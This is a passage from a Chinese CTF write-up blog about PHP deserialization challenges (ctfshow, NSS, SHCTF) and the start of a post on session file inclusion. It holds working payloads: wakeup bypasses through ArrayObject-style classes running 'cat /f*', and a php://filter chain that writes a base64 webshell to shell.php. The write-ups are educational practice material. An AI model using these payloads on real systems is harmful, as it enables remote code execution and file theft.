class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>先来看一下整体的思路： 就是让file_get_contents去读取flag所在的路径</p><p>f接收了function的值 下面的extract函数会进行一个变量覆盖</p><p>如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] =<span class="hljs-string">&#x27;123&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;覆盖前：&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;覆盖后：&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558152.png" alt="image-20230703154953884"></p><p>先看看phpinfo里面有没有什么东西 发现有一个文件名   d0g3_f1ag.php</p><p>然后我们要利用file_get_contents  进行读取的话  需要满足$_GET[‘img_path为空 当它为空时 利用字符串逃逸将guest_img.png  这个名字变成</p><p> d0g3_f1ag.php的名字</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558666.png" alt="image-20230703155417260"></p><p>正常的是这个 </p><p>然后将AA换成flag或者其他字符的话就可以进行字符串逃逸</p><p>我们需要的是：<br>“;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}  就是将base64字符换一下 这个长度是不变的 更方便了</p><p>最终测试结果：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">_SESSION[flagphpimg]=;<span class="hljs-symbol">s:</span><span class="hljs-number">3</span><span class="hljs-symbol">:<span class="hljs-string">&quot;123&quot;</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA=</span>=<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ctfshow-愚人杯-easy-php"><a href="#ctfshow-愚人杯-easy-php" class="headerlink" title="ctfshow 愚人杯 easy_php"></a>ctfshow 愚人杯 easy_php</h1><p>这个是在php7.3下绕过wakeup的一个trick</p><p>这个的话是使用php的一些内置类进行绕过的。用C开头绕过wakeup</p><p>先来看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;ctfshow);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;1+1&gt;2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>思路就是绕过wakeup,下面这个正则匹配就是不能是Oa开头，所以数组绕过就不可以，然后有一种绕过wakeup的方法是在O或a的后面数字的前面加上一个+，但这只是低版本的绕过。</p><p>现在php是7.3版本，需要利用C绕过。</p><p>如果我们仅仅将O改成C的话是不解析的，因为这个C是一个类，不在是一个对象，我们没有对它进行一个serialize 就不能进行反序列化。</p><p>所以我们这个时候就要用到了内置类。</p><p>Arrayobject。</p><p>当然还有其他的也可以用，这里参考师傅的博客：<a href="https://boogipop.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd%20[easy_php]/">https://boogipop.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd%20[easy_php]/</a></p><p>可以用的类有：</p><ul><li><p>ArrayObject::unserialize</p></li><li><p>ArrayIterator::unserialize</p></li><li><p>RecursiveArrayIterator::unserialize</p></li><li><p>SplObjectStorage::unserialize</p><p>下面我们可以进行一个演示。</p><p>ArrayObiect:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();  <span class="hljs-comment">//这个b的话可以是其他字母，没有影响</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558694.png" alt="image-20230923113604625"></p></li></ul><p>ArrayIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558970.png" alt="image-20230923113657744"></p><p>RecursiveArrayIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">RecursiveArrayIterator</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151559200.png" alt="image-20230923113836148"></p><p>SplObjectStorage：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplObjectStorage</span>();<br><span class="hljs-variable">$a</span> -&gt; b = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151559198.png" alt="image-20230923114023257"></p><p>这里我是在本地进行执行的，phpstorm我不知道为什么执行完是O开头的。</p><h1 id="nss上面的一题："><a href="#nss上面的一题：" class="headerlink" title="nss上面的一题："></a>nss上面的一题：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popmart</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yuki</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$molly</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dimoo</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;yuki=<span class="hljs-string">&#x27;tell me where&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;molly=<span class="hljs-string">&#x27;dont_tell_you&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dimoo=<span class="hljs-string">&quot;you_can_guess&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$where_you_go</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;yuki=<span class="hljs-variable">$where_you_go</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;molly === <span class="hljs-variable language_">$this</span>-&gt;yuki)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$pucky</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wq&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pucky</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pucky</span>===<span class="hljs-string">&quot;二仙桥&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pucky</span>===<span class="hljs-string">&quot;二仙桥&quot;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;window.alert(&#x27;说说看，你要去哪？？&#x27;);&lt;/script&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$pucky</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>前面的还好，就是引用绕过，主要是后面的传值，自己不怎么会，这里记录一下。</p><p>好吧，看了wp之后才发现自己是笨比。</p><p>前面因为是变量覆盖，我们可以先让wq=二仙桥 进入第二个if判断中，然后下面就是在post中传入pucky=…..(经过序列化后的值 也就是我们构造后得出来的)</p><h1 id="shctf新生赛-sseerriiaalliizzee"><a href="#shctf新生赛-sseerriiaalliizzee" class="headerlink" title="shctf新生赛  sseerriiaalliizzee"></a>shctf新生赛  sseerriiaalliizzee</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$barking</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;barking = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;barking-&gt;<span class="hljs-title function_ invoke__">dosomething</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$part2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$part1</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$part2</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; part1 = <span class="hljs-variable">$part1</span>;<br>        <span class="hljs-variable language_">$this</span> -&gt; part2 = <span class="hljs-variable">$part2</span>;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$useless</span>   = <span class="hljs-string">&#x27;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$useful</span>= <span class="hljs-variable">$useless</span>. <span class="hljs-variable language_">$this</span>-&gt;part2;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt; part1,<span class="hljs-variable">$useful</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./flag,php&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;barking for fun!&quot;</span>;<br>        <br>    &#125;<br>&#125;<br><br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$code</span>))&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no way, fuck off&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>这里和[羊城杯 2020]EasySer的题非常像</p><p>绕过就是把die给过了</p><p>然后思路就是给part1和part2分别进行伪协议写文件名和base64传木马</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$b</span>-&gt;part1=<span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;</span>;<br><span class="hljs-variable">$b</span>-&gt;part2=<span class="hljs-string">&#x27;PD9waHAgc3lzdGVtKCJjYXQgL2YqIik7Pz4=&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;barking=<span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>session文件包含</title>
    <link href="/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h1><p>参考文章：<a href="https://www.anquanke.com/post/id/201177#h2-1">https://www.anquanke.com/post/id/201177#h2-1</a></p><p>通过session包含的利用条件：<br>1.session文件路径已知</p><p>可以通过phpinfo()查看里面的sesion.save_path来获取</p><p>2.其中部分内容可控</p><p>下面来简单演示这个session文件包含</p><p>session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-variable">$username</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php中session默认是以文件形式进行储存的，文件名是sess_PHPSESSID 这个PHPSESSID是可以知道的，如果我们知道了session的储存位置，可以从phpinfo()中看到相关信息</p><p>并且里面的内容是我们可以控制的，我们就可以利用文件包含达到我们想要的。</p><p><img src="https://s2.loli.net/2023/09/15/tkfF3lU5YRdsXLh.png" alt="image-20230718172140755.png"></p><p><img src="https://s2.loli.net/2023/09/15/QPbLkUKo29fSYDG.png" alt="image-20230718172230624.png"></p><p><img src="https://s2.loli.net/2023/09/15/SbYqGraEfyHnp94.png" alt="image-20230718172351972.png"></p><p>上面的是session储存路径</p><p>以上只是最简单的进行一个利用，通常情况下，会对用户的会话信息进行一个编码，或者说没有session_start() 这样的情况下上面的情况就不能执行成功，所以我们就需要想办法进行绕过。</p><h1 id="下面是几种情况的绕过："><a href="#下面是几种情况的绕过：" class="headerlink" title="下面是几种情况的绕过："></a>下面是几种情况的绕过：</h1><h2 id="1-session经过base64编码"><a href="#1-session经过base64编码" class="headerlink" title="1.session经过base64编码"></a>1.session经过base64编码</h2><p>这种情况下一般想到的是对session解码就可以了，利用那个php伪协议，但是吧，由于base64的编码规则，我们并不能直接利用这个php伪协议，需要构造长度，让php伪协议去解码的时候，不影响后面的。</p><p>session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ 